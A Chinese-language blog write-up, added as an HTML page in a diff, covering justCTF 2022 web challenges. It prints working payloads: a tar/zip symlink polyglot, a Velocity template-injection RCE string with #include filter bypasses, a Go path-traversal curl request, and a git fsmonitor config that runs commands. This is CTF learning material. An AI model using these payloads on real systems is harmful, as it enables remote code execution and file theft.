@@ -1,0 +1,977 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="zh-tw">
+<head>
+    <meta charset="utf-8">
+<title>justCTF 2022 筆記 - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/" rel="alternate" hreflang="en" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2022/06/14/justctf-2022-writeup/">
+    
+
+
+
+
+
+    <meta name="description" content="這個假日有 justCTF 跟全部都是 web 的 WeCTF，我本來想說兩個都打，一邊卡住的話可以跳到另一邊，殊不知兩邊都卡住XD 這次 justCTF 滿多不錯的 web 題，依照慣例寫一下筆記並且記一下關鍵字：  zip&#x2F;tar symlink Velocity SSTI Golang path git 原理 scp 原理 xsleak, STTF + :target sele">
+<meta property="og:type" content="article">
+<meta property="og:title" content="justCTF 2022 筆記">
+<meta property="og:url" content="https://blog.huli.tw/2022/06/14/justctf-2022-writeup/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="這個假日有 justCTF 跟全部都是 web 的 WeCTF，我本來想說兩個都打，一邊卡住的話可以跳到另一邊，殊不知兩邊都卡住XD 這次 justCTF 滿多不錯的 web 題，依照慣例寫一下筆記並且記一下關鍵字：  zip&#x2F;tar symlink Velocity SSTI Golang path git 原理 scp 原理 xsleak, STTF + :target sele">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://blog.huli.tw/img/justctf-2022-writeup/cover.png">
+<meta property="og:image" content="https://blog.huli.tw/img/justctf-2022-writeup/p1.png">
+<meta property="og:image" content="https://blog.huli.tw/img/justctf-2022-writeup/p2.png">
+<meta property="og:image" content="https://blog.huli.tw/img/justctf-2022-writeup/p3.png">
+<meta property="article:published_time" content="2022-06-14T14:27:28.000Z">
+<meta property="article:modified_time" content="2023-05-07T01:15:16.485Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/justctf-2022-writeup/cover.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="justCTF 2022 筆記" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=3.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">文章列表</a>
+            
+            <a class="navbar-item "
+               href="/categories">分類</a>
+            
+            <a class="navbar-item "
+               href="/recommend">推薦閱讀</a>
+            
+            <a class="navbar-item "
+               href="/about">關於我</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="目錄">
+                    目錄
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#symple-unzipper40-solves">1&nbsp;&nbsp;<b>Symple Unzipper(40 solves)</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#velociraptor22-solves">2&nbsp;&nbsp;<b>Velociraptor(22 solves)</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#gobucket18-solves">3&nbsp;&nbsp;<b>GoBucket(18 solves)</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#gitara12-solves">4&nbsp;&nbsp;<b>gitara(12 solves)</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#baby-xsleak7-solves">5&nbsp;&nbsp;<b>Baby XSLeak(7 solves)</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#foreigner5-solves">6&nbsp;&nbsp;<b>Foreigner(5 solves)</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#web-api-intended4-solves">7&nbsp;&nbsp;<b>Web API intended(4 solves)</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#ninja1-solves">8&nbsp;&nbsp;<b>Ninja(1 solves)</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#dank-shark0-solves">9&nbsp;&nbsp;<b>Dank Shark(0 solves)</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
+                
+                <i class="fab fa-medium"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+                <a class="navbar-item" href="/2022/06/14/en/justctf-2022-writeup/">English</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        最近開了一個讀者回饋表單，無論是對文章的感想或是對部落格的感想，有什麼想回饋的都可以填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            justCTF 2022 筆記
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2022-06-14T14:27:28.000Z" itemprop="datePublished">2022年6月14日</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <img src="/img/justctf-2022-writeup/cover.png" style="display:none">
+
+<p>這個假日有 justCTF 跟全部都是 web 的 WeCTF，我本來想說兩個都打，一邊卡住的話可以跳到另一邊，殊不知兩邊都卡住XD</p>
+<p>這次 justCTF 滿多不錯的 web 題，依照慣例寫一下筆記並且記一下關鍵字：</p>
+<ol>
+<li>zip&#x2F;tar symlink</li>
+<li>Velocity SSTI</li>
+<li>Golang path</li>
+<li>git 原理</li>
+<li>scp 原理</li>
+<li>xsleak, STTF + <code>:target</code> selector</li>
+</ol>
+<p>底下的順序以解開的數量排序，越前面越多人解開。</p>
+<span id="more"></span>
+
+<h2><span id="symple-unzipper40-solves">Symple Unzipper(40 solves)</span></h2><p>這題的目標是讀到跟 server code 在同一層的 flag.txt 這個檔案。</p>
+<p>核心程式碼如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">ROOT_DIR <span class="token operator">=</span> Path<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>absolute<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>parent
+UPLOAD_DIR <span class="token operator">=</span> ROOT_DIR <span class="token operator">/</span> <span class="token string">"uploads"</span>
+FLAG_PATH <span class="token operator">=</span> ROOT_DIR <span class="token operator">/</span> <span class="token string">"flag.txt"</span>
+SOURCE_PATH <span class="token operator">=</span> ROOT_DIR <span class="token operator">/</span> <span class="token string">"server.tar.gz"</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">"/extract"</span><span class="token punctuation">,</span> tags<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"extract"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">extract</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">:</span> UploadFile<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Extracts the given ZIP and returns a JSON object containing the contents of every file extracted"""</span>
+    <span class="token keyword">with</span> TemporaryDirectory<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token operator">=</span>UPLOAD_DIR<span class="token punctuation">)</span> <span class="token keyword">as</span> tmpdir<span class="token punctuation">:</span>
+        file_to_extract <span class="token operator">=</span> Path<span class="token punctuation">(</span>tmpdir<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_to_extract<span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+                data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>
+                <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
+                    <span class="token keyword">break</span>
+                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+        <span class="token comment"># make sure the file is a valid zip because Python's zipfile doesn't support symlinks (no hacking!)</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> is_zipfile<span class="token punctuation">(</span>file_to_extract<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">raise</span> HTTPException<span class="token punctuation">(</span>status_code<span class="token operator">=</span><span class="token number">415</span><span class="token punctuation">,</span> detail<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"The input file must be an ZIP archive."</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">with</span> TemporaryDirectory<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token operator">=</span>tmpdir<span class="token punctuation">)</span> <span class="token keyword">as</span> extract_to_dir<span class="token punctuation">:</span>
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                extract_archive<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>file_to_extract<span class="token punctuation">)</span><span class="token punctuation">,</span> outdir<span class="token operator">=</span>extract_to_dir<span class="token punctuation">)</span>
+            <span class="token keyword">except</span> PatoolError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+                <span class="token keyword">raise</span> HTTPException<span class="token punctuation">(</span>status_code<span class="token operator">=</span><span class="token number">400</span><span class="token punctuation">,</span> detail<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"Error extracting ZIP </span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_to_extract<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token conversion-option punctuation">!s</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> read_files<span class="token punctuation">(</span>extract_to_dir<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>先用 <code>is_zipfile</code> 檢查是不是 zip，然後用 patool 的 extract_archive 去解壓縮檔案。從檔名看來就一副跟 symlink 有關的樣子，比賽中我有試過用 zip 去打包 symlink 檔案但是沒用，這題後來是隊友解掉的。</p>
+<p>從 <a target="_blank" rel="noopener" href="https://discord.com/channels/656258740252704788/978312189159030805/985625416356229160">discord</a> 裡面看到別人 po 的解答：</p>
+<pre class="line-numbers language-none"><code class="language-none">ln -fs ..&#x2F;..&#x2F;..&#x2F;flag.txt .
+touch a
+zip a.zip -xi a
+tar --owner 0 --group 0 -cvf payload.tar flag.txt a.zip
+
+curl -v $&#123;1:-symple-unzipper.web.jctf.pro&#125;&#x2F;extract -F &#39;file&#x3D;@payload.tar&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>看了一下其他人在 discord 裡面的討論，大意是說上面這樣做以後，檔案開頭是 tar 的格式，結尾是你包進去的那個 zip，而 <code>is_zipfile</code> 的實作會導致這樣的檔案可以通過（似乎是先檢查 magic byte，找不到會用其他方式判定），因此被判定為是 true，接著就會被底下的 <code>extract_archive</code> 把 tar 解開，然後保留你的 symlink。</p>
+<h2><span id="velociraptor22-solves">Velociraptor(22 solves)</span></h2><p>這題是 Velocity 的 SSTI，上網找會找到這個 RCE payload：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">#<span class="token function">set</span><span class="token punctuation">(</span>$e<span class="token operator">=</span><span class="token string">"e"</span><span class="token punctuation">)</span>
+$e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"touch /tmp/rai4over"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>但是這題因為把這鎖住了所以不能用，flag 在根目錄底下，所以其實不需要 RCE，只要能讀檔就行了，Velocity 有個 include 的指令：</p>
+<pre class="line-numbers language-none"><code class="language-none">#include( &quot;&#x2F;flag.txt&quot; )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>但直接用會丟一個錯誤給你：</p>
+<blockquote>
+<p>Malicious input detected (#include, #parse)</p>
+</blockquote>
+<p>要想辦法繞，我在 discord 裡面看到有人這樣繞：</p>
+<pre class="line-numbers language-none"><code class="language-none">#set($x&#x3D;&quot;#includ&quot;)
+#set($y&#x3D;&#39;e(&quot;&#x2F;flag.txt&quot;)&#39;)
+#set($a&#x3D;&quot;$x$y&quot;)
+
+#evaluate($a)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然後也有人用 unicode 來繞：</p>
+<pre class="line-numbers language-none"><code class="language-none">#set($x&#x3D;&quot;#includ\u0065(&#39;&#x2F;flag.txt&#39;)&quot;)
+$x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2><span id="gobucket18-solves">GoBucket(18 solves)</span></h2><p>這題的核心程式碼如下：</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go">r<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/files/&#123;bucketId&#125;/&#123;filename&#125;"</span><span class="token punctuation">,</span> handleBucket<span class="token punctuation">)</span>
+
+bucketPath <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span><span class="token string">"./buckets/"</span><span class="token punctuation">,</span> bucketId<span class="token punctuation">)</span>
+<span class="token comment">// [...]</span>
+filePath <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>bucketPath<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>從網址配對到 bucketId 跟 filename 以後，做 path 的拼接然後去拿檔案，我們的目標是 <code>buckets/secret_file</code> 這個檔案。</p>
+<p>解法是：</p>
+<pre class="line-numbers language-none"><code class="language-none">curl --path-as-is &#39;http:&#x2F;&#x2F;gobucket.web.jctf.pro&#x2F;files&#x2F;\&#x2F;secret_file&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>從討論中看起來應該是 golang 在處理網址配對時不會把 <code>/\/</code> 這種東西變成 <code>///</code> 之類的，所以 <code>\</code> 就變成一個參數，然後在 windows 上面在做 path join 的時候就沒效果，導致最後的結果可以逃出一層資料夾，讀到 secret_file 這個檔案。</p>
+<p>底下貼<a target="_blank" rel="noopener" href="https://discord.com/channels/656258740252704788/978312189159030805/985700365116776548">原文解釋</a>筆記一下：</p>
+<blockquote>
+<p>golang when it parses the http path and resolves stuff like <code>/../</code> into <code>/</code> etc., doesn’t treat a backslash as a slash as some other things might which allows the backslash to end up being a parameter<br>and (this appears on windows only because of the way it handles paths) when that path parameter ends up being used for constructing a filepath, it can potentially be dangerous as it allows you to skip&#x2F;escape a directory</p>
+</blockquote>
+<h2><span id="gitara12-solves">gitara(12 solves)</span></h2><p>這題的程式碼如下：</p>
+<pre class="line-numbers language-none"><code class="language-none"> &lt;?php
+
+if (!isset($_POST[&#39;domain&#39;]) || preg_match(&#39;&#x2F;[^a-z0-9.-]&#x2F;ims&#39;, $_POST[&#39;domain&#39;]) !&#x3D;&#x3D; 0) &#123;
+    highlight_file(__FILE__);
+&#125; else &#123;
+    $dir &#x3D; &#39;&#x2F;tmp&#x2F;gitara&#39;.rand();
+    mkdir($dir);
+    system(&quot; \
+cd $dir &amp;&amp; \
+timeout 2s sshpass -phunter2 scp -o StrictHostKeyChecking&#x3D;no &#39;justctf-gitara@$_POST[domain]:*&#39; . &amp;&amp; \
+timeout 1m git status; \
+rm -rf $dir&quot;);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其實目標很明顯，就是 chall server 會用 scp 從你的 server 去複製檔案，結束後執行 <code>git status</code>，所以你要利用 git 的一些特性來 RCE。</p>
+<p>當時隊友有貼了一個這個 config：</p>
+<pre class="line-numbers language-none"><code class="language-none">[core]
+    repositoryformatversion &#x3D; 0
+    filemode &#x3D; true
+    bare &#x3D; false
+    logallrefupdates &#x3D; true
+    fsmonitor &#x3D; &quot;echo \&quot;Pwned as $(id)\&quot;&gt;&amp;2; false&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>找到這邊好像有滿完整的解釋：<a target="_blank" rel="noopener" href="https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md">2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md</a>，不過有點長我還沒看就是了。</p>
+<p>總之，如果把 gitconfig 換成上面這個內容，再用 <code>git status</code> 的話，就會執行 fsmonitor 後面的指令。</p>
+<p>但這題的難處不是這個，而是在於你該怎麼樣把一個 git repo 丟到 chall server 上面去。</p>
+<p>當你用 <code>git init</code> 以後，資料夾會多出一個 <code>.git</code> 資料夾，裡面有：</p>
+<ol>
+<li>HEAD</li>
+<li>config</li>
+<li>description</li>
+<li>hooks&#x2F;</li>
+<li>info&#x2F;</li>
+<li>objects&#x2F;</li>
+<li>refs&#x2F;</li>
+</ol>
+<p>但 scp 時的指令是 <code>server:*</code>，所以：</p>
+<ol>
+<li>. 開頭的隱藏檔案不會配對到</li>
+<li>資料夾不會抓下來，因為沒有用 -r</li>
+</ol>
+<p>跟隊友研究了好一陣子，我發現調整一下 config 的話可以縮減到只需要四個檔案，然後也不需要 <code>.git</code> 資料夾：</p>
+<pre class="line-numbers language-none"><code class="language-none">[core]
+    repositoryformatversion &#x3D; 0
+    bare &#x3D; false
+    worktree &#x3D; .&#x2F;
+    fsmonitor &#x3D; &quot;echo \&quot;Pwned as $(id)\&quot;&gt;&amp;2; false&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>檔案結構如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">drwxr-xr-x  6 huli  staff  192  6 14 22:00 .
+drwxr-xr-x  3 huli  staff   96  6 14 21:57 ..
+-rw-r--r--  1 huli  staff   23  6 14 21:57 HEAD
+-rw-r--r--  1 huli  staff  115  6 14 21:59 config
+drwxr-xr-x  4 huli  staff  128  6 14 21:57 objects
+drwxr-xr-x  4 huli  staff  128  6 14 21:57 refs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在底下的資料夾執行 <code>git status</code> 就會跑 fsmonitor 的指令了。</p>
+<p>但是 objects 跟 refs 這兩個資料夾必須存在，我有試圖用檔案來取代但是檢查過不了，後來還跑去翻 git 原始碼，看它到底怎麼檢查的，相關程式碼在這：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/git/git/blob/master/setup.c#L341">https://github.com/git/git/blob/master/setup.c#L341</a></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*
+ * Test if it looks like we're at a git directory.
+ * We want to see:
+ *
+ *  - either an objects/ directory _or_ the proper
+ *    GIT_OBJECT_DIRECTORY environment variable
+ *  - a refs/ directory
+ *  - either a HEAD symlink or a HEAD file that is formatted as
+ *    a proper "ref:", or a regular file HEAD that has a properly
+ *    formatted sha1 object name.
+ */</span>
+<span class="token keyword">int</span> <span class="token function">is_git_directory</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>suspect<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">struct</span> <span class="token class-name">strbuf</span> path <span class="token operator">=</span> STRBUF_INIT<span class="token punctuation">;</span>
+	<span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	<span class="token class-name">size_t</span> len<span class="token punctuation">;</span>
+
+	<span class="token comment">/* Check worktree-related signatures */</span>
+	<span class="token function">strbuf_addstr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> suspect<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">strbuf_complete</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> <span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">strbuf_addstr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> <span class="token string">"HEAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">validate_headref</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span>
+		<span class="token keyword">goto</span> done<span class="token punctuation">;</span>
+
+	<span class="token function">strbuf_reset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">get_common_dir</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> suspect<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	len <span class="token operator">=</span> path<span class="token punctuation">.</span>len<span class="token punctuation">;</span>
+
+	<span class="token comment">/* Check non-worktree-related signatures */</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span>DB_ENVIRONMENT<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span>DB_ENVIRONMENT<span class="token punctuation">)</span><span class="token punctuation">,</span> X_OK<span class="token punctuation">)</span><span class="token punctuation">)</span>
+			<span class="token keyword">goto</span> done<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+		<span class="token function">strbuf_setlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">strbuf_addstr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> <span class="token string">"/objects"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">access</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span>buf<span class="token punctuation">,</span> X_OK<span class="token punctuation">)</span><span class="token punctuation">)</span>
+			<span class="token keyword">goto</span> done<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token function">strbuf_setlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">strbuf_addstr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> <span class="token string">"/refs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">access</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span>buf<span class="token punctuation">,</span> X_OK<span class="token punctuation">)</span><span class="token punctuation">)</span>
+		<span class="token keyword">goto</span> done<span class="token punctuation">;</span>
+
+	ret <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+done<span class="token operator">:</span>
+	<span class="token function">strbuf_release</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">return</span> ret<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>不過沒看出什麼端倪，這題也沒解出來。</p>
